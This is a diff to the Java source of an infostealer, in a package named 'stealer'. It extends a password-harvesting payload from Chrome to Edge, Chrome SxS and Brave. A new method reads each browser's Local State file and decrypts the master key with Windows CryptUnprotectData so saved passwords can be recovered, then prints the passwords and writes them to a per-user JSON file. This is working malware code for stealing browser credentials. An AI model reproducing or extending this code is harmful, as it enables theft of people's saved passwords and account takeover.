@@ -6,17 +6,10 @@ import com.sun.jna.platform.win32.Crypt32Util;
 import dev.chaarlottte.stealer.payload.Payload;
 import dev.chaarlottte.stealer.util.PayloadDelivery;
 import dev.chaarlottte.stealer.util.Utilities;
-import dev.chaarlottte.stealer.util.WebhookMessage;
-import com.fasterxml.jackson.databind.JsonNode;
-import com.fasterxml.jackson.databind.ObjectMapper;
-import com.sun.jna.platform.win32.Crypt32Util;
 import org.json.JSONObject;
 
 import javax.crypto.Cipher;
-import javax.crypto.SecretKeyFactory;
 import javax.crypto.spec.GCMParameterSpec;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.*;
 import java.nio.file.Files;
@@ -25,12 +18,10 @@ import java.util.*;
 
 import java.io.File;
 import java.io.IOException;
-import java.net.URL;
 import java.util.Arrays;
 import java.util.Base64;
-import java.util.Scanner;
 
-public class ChromePasswords implements Payload {
+public class BrowserPasswords implements Payload {
 
     private String chromeKeyringPassword = null;
     private byte[] windowsMasterKey;
@@ -39,7 +30,7 @@ public class ChromePasswords implements Payload {
 
     @Override
     public void execute() throws Exception {
-        if (Utilities.isWindows()) {
+        /*if (Utilities.isWindows()) {
             String pathLocalState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
             File localStateFile = new File(pathLocalState);
 
@@ -56,7 +47,7 @@ public class ChromePasswords implements Payload {
             byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
             byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);
             this.windowsMasterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey, 0);
-        }
+        }*/
 
         HashSet<File> passwordStores = new HashSet<>();
         String userHome = System.getProperty("user.home");
@@ -67,7 +58,11 @@ public class ChromePasswords implements Payload {
                 "/AppData/Local/Google/Chrome/User Data/",
                 "/Application Data/Google/Chrome/User Data",
                 "/Library/Application Support/Google/Chrome",
-                "/.config/chromium"
+                "/.config/chromium",
+                "/AppData/Local/Microsoft/Edge/User Data",
+                "/AppData/Local/Google/Chrome SxS/User Data",
+                "/AppData/Local/Google/Chrome SxS/User Data",
+                "/AppData/Local/BraveSoftware/Brave-Browser/User Data",
         };
 
         String[] profiles = {
@@ -123,6 +118,7 @@ public class ChromePasswords implements Payload {
 
         for(File passwordStore : passwordStores) {
             if (passwordStore.exists()) {
+                setKeyAndStuffForPath(passwordStore.getAbsolutePath().split("User Data")[0] + "User Data\\");
                 Connection connection = null;
                 try {
                     passwordStoreCopy.delete();
@@ -168,6 +164,8 @@ public class ChromePasswords implements Payload {
 
         File file = new File("passwords-" + System.getProperty("user.name") + ".json");
 
+        System.out.println(passwordsObject.toString(4));
+
         FileWriter writer = new FileWriter(file);
         writer.write(passwordsObject.toString(4));
         writer.flush();
@@ -202,7 +200,25 @@ public class ChromePasswords implements Payload {
         }
     }
 
+    private void setKeyAndStuffForPath(String path) {
+        //String pathLocalState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
+        String pathLocalState = path + "\\Local State";
+        File localStateFile = new File(pathLocalState);
 
+        ObjectMapper objectMapper = new ObjectMapper();
+        JsonNode jsonNode = null;
+        try {
+            jsonNode = objectMapper.readTree(localStateFile);
+        } catch (IOException e) {
+            throw new IllegalStateException("Failed to load JSON from Chrome Local State file", e);
+        }
+
+        String encryptedMasterKeyWithPrefixB64 = jsonNode.at("/os_crypt/encrypted_key").asText();
+
+        byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
+        byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);
+        this.windowsMasterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey, 0);
+    }
 
     class Password {
 
